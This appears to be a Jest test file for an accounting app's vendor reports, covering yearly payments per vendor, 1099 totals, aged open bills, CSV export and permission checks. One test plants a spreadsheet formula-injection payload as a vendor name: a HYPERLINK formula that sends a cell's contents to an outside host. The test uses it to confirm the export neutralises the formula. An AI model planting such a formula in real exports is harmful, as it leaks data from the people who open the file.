const {
  resetData, closeDb, models,
} = require('./helpers');
const {
  API, expectOk, makeWorld, makeCompany, makeTech,
} = require('./fixtures');

// Phase 3, step 2, task 6: how much each contractor and supplier was paid in
// a year (what the 1099s need), and the bills still owed, by age.

let w;
let hale;
let cdw;
let n = 0;
const a = () => w.admin.agent;
async function bill(vendor, { total, billDate, dueDate = null, paidOn = null, enter = true }) {
  n += 1;
  const b = expectOk(await a().post(`${API}/money/bills`).send({
    vendorCompanyId: vendor.id, billNumber: `B-${n}`, billDate, dueDate, total, lines: [{ kind: 'contractor', description: 'Work', amount: total }],
  }), 201).bill;
  if (enter) await a().post(`${API}/money/bills/${b.id}/enter`).send({}).expect(200);
  if (paidOn) await a().post(`${API}/money/bills/${b.id}/pay`).send({ paidOn, paidMethod: 'check' }).expect(200);
  return b;
}
const rowFor = (rows, vendor) => rows.find((r) => r.vendorCompanyId === vendor.id);

beforeEach(async () => {
  await resetData();
  w = await makeWorld();
  hale = await makeCompany(w.admin, { name: 'Hale Communication', isClient: false, isVendor: true });
  await a().patch(`${API}/companies/${hale.id}`).send({ is1099: true }).expect(200);
  cdw = await makeCompany(w.admin, { name: 'CDW', isClient: false, isVendor: true });
  await bill(hale, { total: '1250.00', billDate: '2026-12-01', paidOn: '2026-12-15' });
  await bill(hale, { total: '900.00', billDate: '2026-12-20', paidOn: '2027-01-04' });
  await bill(hale, { total: '400.00', billDate: '2026-12-22' }); // entered, not paid
  const voided = await bill(hale, { total: '5000.00', billDate: '2026-12-02', paidOn: '2026-12-03' });
  await a().post(`${API}/money/bills/${voided.id}/void`).send({}).expect(200);
  await bill(cdw, { total: '3000.00', billDate: '2026-11-01', paidOn: '2026-11-20' });
});
afterAll(closeDb);

it('paid per vendor counts payments by the day paid, bills by the bill date, never a void', async () => {
  let rows = expectOk(await a().get(`${API}/money/reports/paid-by-vendor?year=2026`)).vendors;
  expect(rowFor(rows, hale)).toMatchObject({ vendor: 'Hale Communication', is1099: true, paid: '1250.00', billed: '2550.00', bills: 3 });
  expect(rowFor(rows, cdw)).toMatchObject({ paid: '3000.00', billed: '3000.00' });
  rows = expectOk(await a().get(`${API}/money/reports/paid-by-vendor?year=2027`)).vendors;
  expect(rowFor(rows, hale)).toMatchObject({ paid: '900.00', billed: '0.00' });
  expect((await a().get(`${API}/money/reports/paid-by-vendor?year=26`)).status).toBe(400);
});

it('1099 totals: 1099 vendors paid at least the threshold', async () => {
  let r = expectOk(await a().get(`${API}/money/reports/1099?year=2026`));
  expect(r.threshold).toBe('2000.00');
  expect(r.vendors).toEqual([]);
  expectOk(await a().put(`${API}/money/settings`).send({ form1099Threshold: '600' }));
  r = expectOk(await a().get(`${API}/money/reports/1099?year=2026`));
  expect(r.vendors.map((v) => [v.vendor, v.paid])).toEqual([['Hale Communication', '1250.00']]); // CDW isn't a 1099 vendor
  expect((await a().put(`${API}/money/settings`).send({ form1099Threshold: '-1' })).status).toBe(400);
});

it('open bills, aged by due date', async () => {
  await bill(cdw, { total: '100.00', billDate: '2026-10-01', dueDate: '2026-10-15' });
  const r = expectOk(await a().get(`${API}/money/reports/open-bills?asOf=2027-01-10`));
  const by = Object.fromEntries(r.bills.map((b) => [b.total, b]));
  expect(by['400.00']).toMatchObject({ vendor: 'Hale Communication', daysOverdue: 19, bucket: '1-30' }); // no due date: due on its date
  expect(by['100.00']).toMatchObject({ daysOverdue: 87, bucket: '61-90' });
  expect(r.totals).toMatchObject({ '1-30': '400.00', '61-90': '100.00', all: '500.00' });
});

it('CSV is spreadsheet-safe', async () => {
  const evil = await makeCompany(w.admin, { name: '=HYPERLINK("http://x/?d="&A1,"Click")', isClient: false, isVendor: true });
  await bill(evil, { total: '10.00', billDate: '2026-06-01', paidOn: '2026-06-02' });
  const res = await a().get(`${API}/money/reports/paid-by-vendor?year=2026&format=csv`);
  expect(res.status).toBe(200);
  expect(res.headers['content-type']).toMatch(/text\/csv/);
  expect(res.text).toContain('"\'=HYPERLINK(');
  expect((await a().get(`${API}/money/reports/1099?year=2026&format=csv`)).headers['content-type']).toMatch(/text\/csv/);
  expect((await a().get(`${API}/money/reports/open-bills?format=csv`)).headers['content-type']).toMatch(/text\/csv/);
});

it('technicians can\'t; a books viewer can', async () => {
  const tech = await makeTech('tess', w.deptA.id);
  expect((await tech.agent.get(`${API}/money/reports/paid-by-vendor?year=2026`)).status).toBe(403);
  await models.UserPermissionOverride.create({ userId: tech.user.id, permissionKey: 'money.books.view', granted: true });
  require('../../src/services/permissionService').invalidateAllPermissions();
  expect((await tech.agent.get(`${API}/money/reports/1099?year=2026`)).status).toBe(200);
});
